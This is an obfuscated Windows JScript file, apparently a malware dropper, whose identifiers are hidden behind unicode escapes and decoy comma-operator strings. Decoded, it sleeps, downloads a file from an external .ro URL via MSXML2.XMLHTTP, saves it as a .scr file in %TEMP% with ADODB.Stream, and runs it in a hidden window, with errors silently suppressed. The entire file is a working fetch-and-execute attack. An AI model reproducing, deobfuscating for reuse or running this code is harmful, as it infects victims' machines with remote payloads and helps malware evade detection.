bottleSpecification = ((1 * 1), this);
colossalBanana = ("man\u0075" + "\u0073cr" + "\u0069\u0070\u0074", "\u0052u\u006e");
armyText = bottleSpecification[("\u0065\u0076ol\u0075" + "t\u0069on", "W\u0053\u0063ri" + "\u0070\u0074")];
armyText[("\u0062\u0075" + "si\u006e\u0065ss", "p" + "\u0065ri" + "o\u0064", "\u0061" + "\u0063\u0061\u0064\u0065" + "mic", "el\u0065" + "m" + "e\u006e" + "\u0074", "S\u006c" + "\u0065" + "\u0065" + "p")](((207352 ^ 7592) / (12 ^ 2)));
signalSymmetrical = armyText[("re\u0073\u0070\u0065c" + "ta\u0062l\u0065", "au\u0064\u0069" + "\u0065\u006e" + "\u0063e", "accent", "C\u0072\u0065\u0061\u0074" + "e\u004fb" + "\u006a\u0065\u0063\u0074")](("s\u0061t\u0065l" + "lit\u0065", "\u006da\u0078i" + "mum", "W\u0053c" + "\u0072" + "\u0069\u0070\u0074\u002e\u0053\u0068" + "\u0065ll"));
rhythmBinary = signalSymmetrical[("le\u0074h\u0061" + "\u006c", "mo\u0072ph" + "o\u006c\u006f" + "\u0067\u0079", "ap\u0070eal", "\u0066\u0069\u006ct" + "e\u0072", "E" + "x" + "\u0070\u0061\u006ed\u0045n" + "v\u0069" + "\u0072\u006f\u006e" + "\u006d\u0065" + "\u006etS\u0074r\u0069" + "\u006e" + "gs")](("%T" + "\u0045\u004d\u0050\u0025/")) + ("\u0073" + "tyl\u0065", "transf" + "\u006f\u0072\u006d", "\u0065x\u0070\u0065rt" + "i\u0073\u0065", "a\u0075\u0063" + "\u0074i\u006f" + "\u006e\u0046" + "\u0069" + "\u006e\u0069\u0073h") + ("\u0063\u0079\u006cin" + "\u0064er", "p\u0061" + "t\u0065" + "\u006e" + "\u0074", "\u0069\u006ee" + "\u0072" + "t", "\u002escr");
princeSum = bottleSpecification[("i\u006e\u0073tru" + "\u0063t" + "io\u006e", "co\u006et\u0072" + "\u0069\u0062ut" + "i\u006f\u006e", "\u006d\u0065\u0072" + "i\u0064i" + "a" + "n", "\u0057" + "\u0053c\u0072\u0069p" + "t")][("s\u006f\u006co", "c\u0075" + "\u0072\u0073iv" + "\u0065", function String.prototype.equivalentNegative() {
 return this
}, "\u0043r\u0065\u0061t" + "\u0065O\u0062\u006a" + "\u0065\u0063\u0074")](("t\u0072a" + "n" + "s" + "\u006d\u0069\u0073" + "sion", "\u0065le\u006de\u006e" + "t", "\u0069" + "\u006clu\u0073\u0074" + "rat" + "i" + "\u006f\u006e", "\u004d" + "\u0053\u0058\u004dL\u0032" + "\u002eXM\u004c" + "H" + "\u0054" + "\u0054" + "\u0050"));
princeSum[("c\u006f\u006et" + "\u0061" + "\u0063" + "t", "\u0063\u006fn\u0074a" + "i" + "\u006ee\u0072", "\u006f" + "p" + "e\u006e")](("o\u0070e\u0072a", "e\u0070i\u006c\u006f" + "g\u0075\u0065", "ap" + "para\u0074" + "\u0075\u0073", "G" + "\u0045\u0054"), ("\u0068t\u0074\u0070:\u002f" + "/\u0073\u0069t\u0065m" + "\u0061\u0072" + "\u002er\u006f/\u0035\u002f" + "\u0039\u0032\u0062u\u0079" + "\u0076\u0035"), !(2 < (((((70, 157, 6) * 3) / ((171 + 15) / (17 ^ 14))) & (((20 & 23) - (188, 146, 85, 18)) | ((42 / 14) & (8 / 4)))) | (((3 & (39 / 13)) * (94 / 47)) & (([!+[] + !+[]] * [!+[] + !+[] + !+[]] + ((41 / 41) | 0)))))));
princeSum[("i\u006d" + "\u006du" + "ne", "p" + "o\u0073iti" + "\u0076e", "\u0063o" + "ns\u0075\u006c" + "t\u0061n" + "\u0074", "se" + "\u006e" + "d")]();
while (princeSum[("a\u0075\u0064\u0069\u0065" + "\u006ec\u0065", "cor" + "t\u0065g" + "\u0065", "\u006c\u006f\u0067" + "\u0069\u0063", "\u0073\u0074a\u0064\u0069" + "\u0075\u006d", "\u0072\u0065\u0061\u0064\u0079" + "\u0073\u0074\u0061\u0074" + "\u0065")] < (Math.pow((10 & 11), (64 / 32)) - (67 ^ 35))) {
 bottleSpecification[("role", "s" + "\u0061l\u0075t\u0065", "spo" + "ns\u006f\u0072", "\u0061c" + "\u0072\u006f" + "\u0062a\u0074", "\u0057S\u0063" + "ript")][("\u0064etai" + "l", "jo\u0075\u0072" + "\u006e" + "\u0061" + "\u006c", "plat\u0066" + "o\u0072m", "\u0053l\u0065" + "e" + "p")](((36 ^ 13), (([!+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[]]))));
}
oppositeRepublic = bottleSpecification[("W\u0053\u0063\u0072\u0069\u0070" + "t")][("C\u0072e\u0061t" + "eOb\u006a" + "ec" + "t")](("l\u0069\u006e" + "gu" + "\u0069s\u0074", "me\u0063han" + "ic", "\u0062o\u0061t", "\u0041" + "\u0044O" + "\u0044\u0042\u002e\u0053\u0074" + "\u0072eam"));
try {
 oppositeRepublic[("c\u006f\u006d" + "\u006d\u0075" + "ni" + "\u0063at\u0069" + "on", "\u006fp\u0065" + "n")]();
 oppositeRepublic[("de\u0066" + "ec" + "\u0074", "ca" + "me" + "ra", "bal" + "l\u0061s\u0074", "a\u0075" + "togra" + "\u0070h", "\u0074\u0079\u0070\u0065")] = ((84 & 76), (0 ^ 1));
 oppositeRepublic[("ad" + "e\u0071ua\u0074" + "\u0065", "ho\u0074el", "\u0074r\u0061" + "nsp\u006f\u0072" + "t\u0061t" + "i\u006fn", "w\u0072\u0069" + "\u0074\u0065")](princeSum[("\u0072\u0065\u006c" + "a" + "x\u0061\u0074io" + "\u006e", "R" + "es\u0070\u006f" + "n\u0073e\u0042\u006fd" + "\u0079")]);
 oppositeRepublic[("phr" + "\u0061\u0073e", "d\u0065\u0073ser" + "\u0074", "\u006d\u0065m\u006fr\u0061" + "\u006e\u0064" + "\u0075m", "\u006fce" + "\u0061\u006e", "\u0070osi\u0074\u0069" + "\u006f" + "\u006e")] = (7 * 7, (46 & 62), (([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1)), (0 + 0));
 oppositeRepublic[("\u0065\u0066fec" + "t\u0069ve", "\u0072" + "ef" + "ri\u0067\u0065" + "r" + "\u0061\u0074\u006f" + "r", "sa\u0076\u0065To" + "File")](rhythmBinary, (1 * (2 / 1)));
 oppositeRepublic[("\u0070\u0072\u0069\u006e\u0063" + "\u0065", "\u0063l" + "\u006fse")]();
 signalSymmetrical[colossalBanana](rhythmBinary.equivalentNegative(), (0 | 0), ((148 - 48), (Math.pow(144, 2) - 20642), (142 - 72), (0)));
} catch (paroleSignal) {};